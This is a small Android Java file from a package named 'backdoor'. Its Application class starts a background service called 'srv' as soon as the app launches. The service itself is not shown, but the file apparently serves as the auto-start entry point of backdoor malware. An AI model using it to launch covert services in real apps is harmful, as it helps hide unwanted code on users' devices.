package com.voila.backdoor;
import android.app.*;
import android.content.*;
import android.util.*;

public class init extends Application
{
	@Override
	public void onCreate()
	{
		// TODO: Implement this method
		
		super.onCreate();
		Log.i("fuck","init");
		Intent i=new Intent(this,srv.class);
		//i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		startService(i);
	}
	
}
